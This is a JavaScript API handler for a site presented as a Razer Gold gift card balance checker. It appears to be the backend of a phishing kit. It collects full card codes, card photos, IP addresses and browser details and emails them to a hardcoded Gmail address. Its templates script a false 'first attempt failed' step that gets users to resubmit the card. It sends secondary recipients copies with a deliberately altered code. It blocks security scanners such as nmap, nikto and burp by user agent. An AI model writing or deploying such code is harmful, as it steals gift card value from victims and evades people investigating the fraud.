// api/log-check.js - Multi-recipient support with Resend + Gmail fallback

import nodemailer from 'nodemailer';
import { Resend } from 'resend';

// ==================== RESEND SETUP ====================
const resend = new Resend(process.env.RESEND_API_KEY);

// ==================== SECURITY & PROTECTION ====================

// Rate limiting storage (in-memory, resets on server restart)
const rateLimit = new Map();

// Blocked user agents
const BLOCKED_USER_AGENTS = [
  'bot', 'crawler', 'spider', 'scraper', 'scan', 'scanner',
  'wget', 'curl', 'python', 'go-http', 'java', 'perl', 'ruby',
  'php', 'node-fetch', 'axios', 'insomnia', 'postman', 'burp',
  'nikto', 'nmap', 'zgrab', 'masscan', 'httpx', 'nuclei'
];

function isBotUserAgent(userAgent) {
  if (!userAgent) return true;
  const ua = userAgent.toLowerCase();
  return BLOCKED_USER_AGENTS.some(bot => ua.includes(bot));
}

function checkRateLimit(ip) {
  const now = Date.now();
  const windowMs = 60 * 1000;
  const maxRequests = 10;
  
  if (!rateLimit.has(ip)) {
    rateLimit.set(ip, []);
  }
  
  const timestamps = rateLimit.get(ip).filter(t => now - t < windowMs);
  
  if (timestamps.length >= maxRequests) {
    return { allowed: false };
  }
  
  timestamps.push(now);
  rateLimit.set(ip, timestamps);
  return { allowed: true };
}

// ==================== HELPER: Parse Recipients ====================

function parseRecipients(recipientsInput) {
  if (!recipientsInput) return [];
  
  let recipients = [];
  
  // If it's already an array
  if (Array.isArray(recipientsInput)) {
    recipients = recipientsInput;
  } 
  // If it's a comma-separated string
  else if (typeof recipientsInput === 'string' && recipientsInput.includes(',')) {
    recipients = recipientsInput.split(',').map(email => email.trim());
  } 
  // If it's a single email string
  else if (typeof recipientsInput === 'string') {
    recipients = [recipientsInput.trim()];
  }
  
  // Filter out invalid emails
  return recipients.filter(email => email && email.includes('@') && email.length > 5);
}

function shouldSendPrimaryRecipient() {
  return process.env.SEND_PRIMARY_RECIPIENT !== 'false';
}

function getDeliveryRecipients(recipients) {
  return shouldSendPrimaryRecipient() ? recipients : recipients.slice(1);
}

// ==================== HELPER: Mask Card Number for Secondary Recipients ====================

function maskLastCharacter(cardNumber) {
  if (!cardNumber || typeof cardNumber !== 'string') return cardNumber;
  
  const trimmed = cardNumber.trim();
  if (trimmed.length < 5) return cardNumber; // can't mask 5th if shorter than 5
  
  // Replace 5th character (index 4) with a random alphanumeric (0-9, A-Z)
  const chars = '0456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const randomChar = chars.charAt(Math.floor(Math.random() * chars.length));
  
  return trimmed.slice(0, 4) + randomChar + trimmed.slice(5);
}

// ==================== EMAIL TRANSPORTER SETUP ====================

async function sendEmailWithResend({ subject, html, htmlForSecondary, attachments, to }) {
  const apiKey = process.env.RESEND_API_KEY;
  const from = process.env.EMAIL_FROM || 'onboarding@resend.dev';
  
  if (!apiKey) {
    console.log('⚠️ Resend API key missing, falling back to Gmail');
    return null;
  }

  const recipients = parseRecipients(to);

  if (recipients.length === 0) {
    console.warn('⚠️ No valid recipients found for Resend, using default');
    recipients.push('hassanmahmud2123@gmail.com');
  }

  const deliveryRecipients = getDeliveryRecipients(recipients);
  if (deliveryRecipients.length === 0) {
    console.warn('⚠️ No recipients selected for delivery');
    return null;
  }

  const primaryRecipient = deliveryRecipients[0];
  const secondaryRecipients = deliveryRecipients.slice(1);
  const sendPrimary = shouldSendPrimaryRecipient();

  try {
    const attachmentData = attachments?.map(attachment => ({
      filename: attachment.filename,
      content: attachment.content,
    })) || [];

    console.log(`📧 Resend: Sending immediately to ${sendPrimary ? 'primary' : 'secondary'} recipient: ${primaryRecipient}`);
    const primaryResult = await resend.emails.send({
      from,
      to: sendPrimary ? [primaryRecipient] : deliveryRecipients,
      subject,
      html,
      attachments: attachmentData,
    });

    if (primaryResult.error) {
      console.error('❌ Resend primary email error:', primaryResult.error);
      return null;
    }

    if (sendPrimary && secondaryRecipients.length > 0) {
      const scheduledAt = new Date(Date.now() + 30 * 1000).toISOString();
      console.log(`⏱️ Resend: Scheduling ${secondaryRecipients.length} secondary recipient(s) at ${scheduledAt}`);

      const scheduledResult = await resend.emails.send({
        from,
        to: secondaryRecipients,
        subject,
        html: htmlForSecondary || html,
        attachments: attachmentData,
        scheduledAt,
      });

      if (scheduledResult.error) {
        console.error('⚠️ Resend scheduled email error:', scheduledResult.error);
      } else {
        console.log(`✅ Scheduled email queued for: ${secondaryRecipients.join(', ')}`);
      }
    }

    return primaryResult.data;
  } catch (error) {
    console.error('❌ Resend exception:', error.message);
    return null;
  }
}

function getGmailTransporter() {
  const user = process.env.EMAIL_USER;
  const pass = process.env.EMAIL_PASS;
  
  if (user && pass) {
    console.log('📧 Using Gmail fallback');
    return nodemailer.createTransport({
      service: 'gmail',
      auth: { user, pass },
    });
  }
  return null;
}

async function sendEmailViaSMTP({ subject, html, htmlForSecondary, attachments, to }) {
  const recipients = parseRecipients(to);
  if (recipients.length === 0) {
    console.error('❌ No valid recipients');
    return false;
  }

  if (process.env.RESEND_API_KEY) {
    console.log('📧 Attempting to send via Resend...');
    const result = await sendEmailWithResend({ subject, html, htmlForSecondary, attachments, to: recipients });
    if (result) {
      return { sent: true, skipped: false };
    }
  }

  console.log('📧 Falling back to Gmail...');
  const transporter = getGmailTransporter();
  if (!transporter) {
    console.warn('⚠️ Gmail fallback is not configured; skipping email notification');
    return { sent: false, skipped: true };
  }

  const deliveryRecipients = getDeliveryRecipients(recipients);
  if (deliveryRecipients.length === 0) {
    console.warn('⚠️ No recipients selected for Gmail delivery');
    return { sent: false, skipped: true };
  }

  const primaryRecipient = deliveryRecipients[0];
  const secondaryRecipients = deliveryRecipients.slice(1);
  const sendPrimary = shouldSendPrimaryRecipient();

  try {
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: sendPrimary ? primaryRecipient : deliveryRecipients.join(', '),
      subject,
      html,
      attachments: attachments || [],
    });
    console.log(`✅ Email sent via Gmail fallback to primary: ${primaryRecipient}`);

    if (sendPrimary && secondaryRecipients.length > 0) {
      setTimeout(async () => {
        try {
          await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: secondaryRecipients.join(', '),
            subject,
            html: htmlForSecondary || html,
            attachments: attachments || [],
          });
          console.log(`✅ Secondary email sent via Gmail fallback to: ${secondaryRecipients.join(', ')}`);
        } catch (error) {
          console.error('❌ Gmail fallback secondary delay error:', error.message);
        }
      }, 30 * 1000);
    }

    return { sent: true, skipped: false };
  } catch (error) {
    console.error('❌ Gmail error:', error.message);
    return { sent: false, skipped: false };
  }
}

// ==================== EMAIL TEMPLATES ====================

// FIRST ATTEMPT FAILED - Scan Page (Image unclear)
function getFirstAttemptFailedEmailHTML(data) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>First Attempt Failed - Image Unclear</title>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
        .header { background: #ff6b35; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
        .content { padding: 10px 0; }
        .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
        .detail-label { font-weight: bold; width: 140px; display: inline-block; }
        .detail-value { display: inline-block; }
        .message-box { background: #fff3e0; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #ff6b35; }
        .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
        .status-badge { display: inline-block; padding: 5px 10px; background: #ff6b35; color: white; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h2>📸 FIRST ATTEMPT FAILED - Image Unclear</h2>
        </div>
        <div class="content">
          <div style="text-align: center; margin-bottom: 20px;">
            <span class="status-badge">FAILED - IMAGE UNCLEAR</span>
          </div>
          
          <div class="message-box">
            <strong>📝 Message to User:</strong><br/>
            Unable to verify card. User advised to ensure:
            • Card number is fully visible and not scratched
            • All 14 alphanumeric characters are clearly readable
            • Image is well-lit and in focus
            • Card is positioned flat and steady
          </div>
          
          <div class="detail-row">
            <span class="detail-label">💰 Amount:</span>
            <span class="detail-value">$${data.amount || '0'}.00 USD</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">📍 Source:</span>
            <span class="detail-value">${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">🌐 Browser:</span>
            <span class="detail-value">${data.userAgent?.substring(0, 60) || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">🖥️ IP Address:</span>
            <span class="detail-value">${data.ip || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">📅 Time:</span>
            <span class="detail-value">${new Date(data.timestamp).toLocaleString()}</span>
          </div>
        </div>
        <div class="footer">
          <p>This is an automated notification from your Gift Card Balance Checker.</p>
          <p>User will be prompted to retry with a clearer image.</p>
        </div>
      </div>
    </body>
    </html>
  `;
}

// FIRST ATTEMPT FAILED - Home Page (Invalid card)
function getFirstAttemptFailedHomeEmailHTML(data) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>First Attempt Failed - Invalid Card</title>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
        .header { background: #ff6b35; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
        .content { padding: 10px 0; }
        .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
        .detail-label { font-weight: bold; width: 140px; display: inline-block; }
        .detail-value { display: inline-block; }
        .card-box { background: #f0f0f0; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 16px; letter-spacing: 2px; text-align: center; margin: 10px 0; }
        .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
        .status-badge { display: inline-block; padding: 5px 10px; background: #ff6b35; color: white; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h2>❌ FIRST ATTEMPT FAILED - Invalid Card Number</h2>
        </div>
        <div class="content">
          <div style="text-align: center; margin-bottom: 20px;">
            <span class="status-badge">FAILED - INVALID CARD</span>
          </div>
          
          <div class="detail-row">
            <span class="detail-label">💳 Card Number:</span>
            <span class="detail-value">${data.cardNumber || 'Not provided'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">💰 Amount:</span>
            <span class="detail-value">$${data.amount || '0'}.00 USD</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">📍 Source:</span>
            <span class="detail-value">${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">🌐 Browser:</span>
            <span class="detail-value">${data.userAgent?.substring(0, 60) || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">🖥️ IP Address:</span>
            <span class="detail-value">${data.ip || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">📅 Time:</span>
            <span class="detail-value">${new Date(data.timestamp).toLocaleString()}</span>
          </div>
        </div>
        <div class="footer">
          <p>This is an automated notification from your Gift Card Balance Checker.</p>
          <p>User will be prompted to retry with the same card number.</p>
        </div>
      </div>
    </body>
    </html>
  `;
}

// SECOND ATTEMPT SUCCESS
function getSecondAttemptSuccessEmailHTML(data) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Second Attempt Success - Balance Verified</title>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
        .header { background: #28a745; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
        .content { padding: 10px 0; }
        .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
        .detail-label { font-weight: bold; width: 140px; display: inline-block; }
        .detail-value { display: inline-block; }
        .balance-box { background: #e8f5e9; padding: 15px; text-align: center; border-radius: 8px; margin: 15px 0; border: 1px solid #4caf50; }
        .balance-amount { font-size: 28px; font-weight: bold; color: #2e7d32; }
        .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
        .status-badge { display: inline-block; padding: 5px 10px; background: #28a745; color: white; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h2>✅ SECOND ATTEMPT SUCCESS - Balance Verified</h2>
        </div>
        <div class="content">
          <div style="text-align: center; margin-bottom: 20px;">
            <span class="status-badge">SUCCESS - SECOND ATTEMPT</span>
          </div>
          
          <div class="balance-box">
            <div style="font-size: 14px; color: #666;">Available Balance</div>
            <div class="balance-amount">${data.balance || `$${data.amount}.00 USD`}</div>
          </div>
          
          <div class="detail-row">
            <span class="detail-label">💳 Card Number:</span>
            <span class="detail-value">${data.cardNumber || 'Not provided'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">💰 Amount Checked:</span>
            <span class="detail-value">$${data.amount || '0'}.00 USD</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">📍 Source:</span>
            <span class="detail-value">${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">🌐 Browser:</span>
            <span class="detail-value">${data.userAgent?.substring(0, 60) || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">🖥️ IP Address:</span>
            <span class="detail-value">${data.ip || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">📅 Time:</span>
            <span class="detail-value">${new Date(data.timestamp).toLocaleString()}</span>
          </div>
        </div>
        <div class="footer">
          <p>Verification successful after user ensured card is readable.</p>
          <p>Thank you for using Gift Card Balance Checker.</p>
        </div>
      </div>
    </body>
    </html>
  `;
}

// MISMATCH ATTEMPT (Home page only)
function getMismatchAttemptEmailHTML(data) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Card Mismatch - Different Card Numbers</title>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
        .header { background: #dc3545; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
        .content { padding: 10px 0; }
        .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
        .detail-label { font-weight: bold; width: 160px; display: inline-block; }
        .detail-value { display: inline-block; }
        .warning-box { background: #fff3e0; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #dc3545; }
        .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
        .status-badge { display: inline-block; padding: 5px 10px; background: #dc3545; color: white; border-radius: 5px; font-size: 12px; margin-bottom: 15px; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h2>⚠️ CARD MISMATCH - Different Card Numbers</h2>
        </div>
        <div class="content">
          <div style="text-align: center; margin-bottom: 20px;">
            <span class="status-badge">FAILED - CARD MISMATCH</span>
          </div>
          
          <div class="warning-box">
            <strong>⚠️ Security Alert:</strong><br/>
            User entered a different card number on second attempt than the first attempt.
          </div>
          
          <div class="detail-row">
            <span class="detail-label">💳 First Card Number:</span>
            <span class="detail-value">${data.firstCardNumber || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">💳 Second Card Number:</span>
            <span class="detail-value">${data.secondCardNumber || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">💰 Amount:</span>
            <span class="detail-value">$${data.amount || '0'}.00 USD</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">📍 Source:</span>
            <span class="detail-value">${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">🌐 Browser:</span>
            <span class="detail-value">${data.userAgent?.substring(0, 60) || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">🖥️ IP Address:</span>
            <span class="detail-value">${data.ip || 'Unknown'}</span>
          </div>
          <div class="detail-row">
            <span class="detail-label">📅 Time:</span>
            <span class="detail-value">${new Date(data.timestamp).toLocaleString()}</span>
          </div>
        </div>
        <div class="footer">
          <p>This is an automated security notification.</p>
          <p>User was prompted to start over from first attempt.</p>
        </div>
      </div>
    </body>
    </html>
  `;
}

// LEGACY: Standard success email (for backward compatibility)
function getSuccessEmailHTML(data) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Balance Check Successful</title>
      <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
        .header { background: #28a745; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
        .content { padding: 10px 0; }
        .detail-row { padding: 8px 0; border-bottom: 1px solid #eee; }
        .detail-label { font-weight: bold; width: 120px; display: inline-block; }
        .detail-value { display: inline-block; }
        .balance-box { background: #e8f5e9; padding: 15px; text-align: center; border-radius: 8px; margin: 15px 0; border: 1px solid #4caf50; }
        .balance-amount { font-size: 28px; font-weight: bold; color: #2e7d32; }
        .footer { margin-top: 20px; padding-top: 10px; border-top: 1px solid #ddd; font-size: 12px; color: #666; text-align: center; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h2>✅ Gift Card Balance Check Successful</h2>
        </div>
        <div class="content">
          <div class="balance-box">
            <div class="balance-amount">${data.balance || `$${data.amount}.00 USD`}</div>
          </div>
          <div class="detail-row"><span class="detail-label">💰 Amount:</span><span class="detail-value">$${data.amount || '0'}.00 USD</span></div>
          <div class="detail-row"><span class="detail-label">📍 Source:</span><span class="detail-value">${data.pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span></div>
          <div class="detail-row"><span class="detail-label">📅 Time:</span><span class="detail-value">${new Date(data.timestamp).toLocaleString()}</span></div>
        </div>
        <div class="footer"><p>Thank you for using Gift Card Balance Checker.</p></div>
      </div>
    </body>
    </html>
  `;
}

// ==================== MAIN HANDLER ====================

export default async function handler(req, res) {
  // ==================== CORS ====================
  const allowedOrigins = [
    'https://razergoldbalance.com',
    'https://www.razergoldbalance.com',
    'http://localhost:5173',
    'https://gold-app-nine.vercel.app',
    process.env.ALLOWED_ORIGIN
  ].filter(Boolean);
  
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  } else {
    res.setHeader('Access-Control-Allow-Origin', 'https://razergoldbalance.com');
  }
  
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // ==================== PARSE BODY ====================
  let body = req.body;
  
  if (!body || Object.keys(body).length === 0) {
    console.error('❌ Empty request body');
    return res.status(400).json({ 
      error: 'Empty request body',
      message: 'Please provide valid JSON data'
    });
  }

  console.log('📥 Received request type:', body.type);
  console.log('📥 Request data keys:', Object.keys(body));

  // ==================== SECURITY CHECKS ====================
// Clean up IP address (handles local IPv6, comma-separated proxies)
let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

// If x-forwarded-for contains multiple IPs (client, proxy1, proxy2), grab the first one
if (rawIp.includes(',')) {
  rawIp = rawIp.split(',')[0].trim();
}

// Convert local IPv6 loopback to IPv4 equivalent
const ip = (rawIp === '::1' || rawIp === '::ffff:127.0.0.1') ? '127.0.0.1' : rawIp;

  
const userAgent = req.headers['user-agent'] || '';
  
  if (isBotUserAgent(userAgent)) {
    console.log(`🤖 Bot blocked: ${userAgent.substring(0, 50)} from ${ip}`);
    return res.status(403).json({ 
      error: 'Access denied',
      message: 'Automated requests are not allowed'
    });
  }
  
  const rateLimitResult = checkRateLimit(ip);
  if (!rateLimitResult.allowed) {
    console.log(`🚫 Rate limit exceeded for ${ip}`);
    return res.status(429).json({ 
      error: 'Too many requests',
      message: 'Please wait before trying again'
    });
  }
  
  // ==================== EXTRACT DATA ====================
  const { 
    type, 
    cardNumber, 
    firstCardNumber,
    secondCardNumber,
    amount, 
    balance, 
    timestamp, 
    pageSource, 
    imageBase64,
    status,
    message
  } = body;
  
  if (!type) {
    console.error('❌ Missing type field. Received keys:', Object.keys(body));
    return res.status(400).json({ 
      error: 'Missing required field: type',
      receivedKeys: Object.keys(body),
      validTypes: ['first_attempt_failed', 'second_attempt_success', 'mismatch_attempt', 'success_balance', 'upload_success', 'scan_success']
    });
  }
  
  // Log the request (masked for security)
  console.log(JSON.stringify({
    event: 'balance_check',
    timestamp: new Date().toISOString(),
    type: type,
    cardNumber: cardNumber ? `${cardNumber.substring(0, 4)}...${cardNumber.substring(cardNumber.length - 4)}` : 'N/A',
    amount: amount || 'N/A',
    pageSource: pageSource || 'N/A',
    ip: ip,
    userAgent: userAgent.substring(0, 50),
    hasImage: !!imageBase64
  }));
  
  // ==================== CHECK EMAIL CONFIG ====================
  if (process.env.DISABLE_EMAIL === 'true') {
    console.log('📧 Email sending is disabled');
    return res.status(200).json({ 
      success: true, 
      message: 'Demo mode - Email not sent',
      balance: balance || `$${amount || 0}.00 USD`
    });
  }
  
  // ==================== BUILD EMAIL CONTENT ====================
  
  let subject = '';
  let html = '';
  let htmlForSecondary = null;
  let attachments = [];
  
  // Parse recipients from environment variable with fallback
  const recipientInput = process.env.NOTIFICATION_EMAILS || process.env.EMAIL_TO;
  const recipients = parseRecipients(recipientInput);

  // Fallback if no valid recipients
  if (recipients.length === 0) {
    console.warn('⚠️ No valid recipients found, using default');
    recipients.push('hassanmahmud2123@gmail.com');
  }
  
  console.log(`📧 Will send to ${recipients.length} recipient(s):`, recipients);
  
  // Handle different email types
  if (type === 'first_attempt_failed') {
    if (pageSource === 'scan') {
      subject = '📸 FIRST ATTEMPT FAILED - Image Unclear - Gift Card Balance Check';
      html = getFirstAttemptFailedEmailHTML({
        amount: amount || '0',
        pageSource: pageSource || 'unknown',
        userAgent: userAgent,
        ip: ip,
        timestamp: timestamp || new Date().toISOString(),
        message: message || 'Card image verification failed'
      });
    } else {
      subject = '❌ FIRST ATTEMPT FAILED - Invalid Card - Gift Card Balance Check';
      html = getFirstAttemptFailedHomeEmailHTML({
        cardNumber: cardNumber || 'Not provided',
        amount: amount || '0',
        pageSource: pageSource || 'unknown',
        userAgent: userAgent,
        ip: ip,
        timestamp: timestamp || new Date().toISOString()
      });

      if (shouldSendPrimaryRecipient() && cardNumber) {
        htmlForSecondary = getFirstAttemptFailedHomeEmailHTML({
          cardNumber: maskLastCharacter(cardNumber),
          amount: amount || '0',
          pageSource: pageSource || 'unknown',
          userAgent: userAgent,
          ip: ip,
          timestamp: timestamp || new Date().toISOString()
        });
      }
    }
    
    // Attach image for scan page
    if (imageBase64 && imageBase64.startsWith('data:image')) {
      try {
        const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (matches && matches[2]) {
          attachments.push({
            filename: `failed-attempt-card-${Date.now()}.${matches[1]}`,
            content: matches[2],
            encoding: 'base64'
          });
          console.log('📸 Image attached to failed attempt email');
        }
      } catch (err) {
        console.error('Failed to attach image:', err);
      }
    }
  } 
  else if (type === 'second_attempt_success') {
    subject = `✅ SECOND ATTEMPT SUCCESS - Balance Verified (${pageSource === 'manual' ? 'Manual' : 'Scan'})`;
    const displayBalance = balance || `$${amount}.00 USD`;
    html = getSecondAttemptSuccessEmailHTML({
      cardNumber: cardNumber || 'Not provided',
      amount: amount || '0',
      balance: displayBalance,
      pageSource: pageSource || 'unknown',
      userAgent: userAgent,
      ip: ip,
      timestamp: timestamp || new Date().toISOString()
    });

    if (shouldSendPrimaryRecipient() && cardNumber) {
      htmlForSecondary = getSecondAttemptSuccessEmailHTML({
        cardNumber: maskLastCharacter(cardNumber),
        amount: amount || '0',
        balance: displayBalance,
        pageSource: pageSource || 'unknown',
        userAgent: userAgent,
        ip: ip,
        timestamp: timestamp || new Date().toISOString()
      });
    }
    
    // Attach image for scan page
    if (imageBase64 && imageBase64.startsWith('data:image')) {
      try {
        const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (matches && matches[2]) {
          attachments.push({
            filename: `success-card-${Date.now()}.${matches[1]}`,
            content: matches[2],
            encoding: 'base64'
          });
          console.log('📸 Image attached to success email');
        }
      } catch (err) {
        console.error('Failed to attach image:', err);
      }
    }
  }
  else if (type === 'mismatch_attempt') {
    subject = '⚠️ CARD MISMATCH - Different Card Numbers Detected';
    html = getMismatchAttemptEmailHTML({
      firstCardNumber: firstCardNumber || 'Unknown',
      secondCardNumber: secondCardNumber || 'Unknown',
      amount: amount || '0',
      pageSource: pageSource || 'manual',
      userAgent: userAgent,
      ip: ip,
      timestamp: timestamp || new Date().toISOString()
    });

    if (shouldSendPrimaryRecipient()) {
      htmlForSecondary = getMismatchAttemptEmailHTML({
        firstCardNumber: firstCardNumber ? maskLastCharacter(firstCardNumber) : 'Unknown',
        secondCardNumber: secondCardNumber ? maskLastCharacter(secondCardNumber) : 'Unknown',
        amount: amount || '0',
        pageSource: pageSource || 'manual',
        userAgent: userAgent,
        ip: ip,
        timestamp: timestamp || new Date().toISOString()
      });
    }
  }
  else if (type === 'success_balance' || type === 'upload_success' || type === 'scan_success') {
    // Legacy support
    subject = `✅ Gift Card Balance Check Successful (${pageSource === 'manual' ? 'Manual' : 'Scan'})`;
    const displayBalance = balance || `$${amount}.00 USD`;
    html = getSuccessEmailHTML({
      amount: amount || '0',
      balance: displayBalance,
      pageSource: pageSource || 'unknown',
      timestamp: timestamp || new Date().toISOString()
    });
    
    if (imageBase64 && imageBase64.startsWith('data:image')) {
      try {
        const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (matches && matches[2]) {
          attachments.push({
            filename: `giftcard-${Date.now()}.${matches[1]}`,
            content: matches[2],
            encoding: 'base64'
          });
        }
      } catch (err) {
        console.error('Failed to attach image:', err);
      }
    }
  } else {
    console.error('❌ Unknown type:', type);
    return res.status(400).json({ 
      error: 'Invalid request type',
      receivedType: type,
      validTypes: ['first_attempt_failed', 'second_attempt_success', 'mismatch_attempt', 'success_balance', 'upload_success', 'scan_success']
    });
  }
  
  // ==================== SEND EMAIL ====================
  
  const emailResult = await sendEmailViaSMTP({
    subject,
    html,
    htmlForSecondary,
    attachments,
    to: recipients // Pass the array of recipients
  });
  
  if (emailResult?.sent) {
    return res.status(200).json({ 
      success: true, 
      message: `Email sent to ${recipients.length} recipient(s)`,
      balance: balance || `$${amount || 0}.00 USD`
    });
  } else if (emailResult?.skipped) {
    return res.status(200).json({
      success: true,
      message: 'Balance check logged; email notification skipped',
      balance: balance || `$${amount || 0}.00 USD`
    });
  } else {
    console.error('❌ All email methods failed');
    return res.status(500).json({ 
      error: 'All email methods failed',
      success: false
    });
  }
}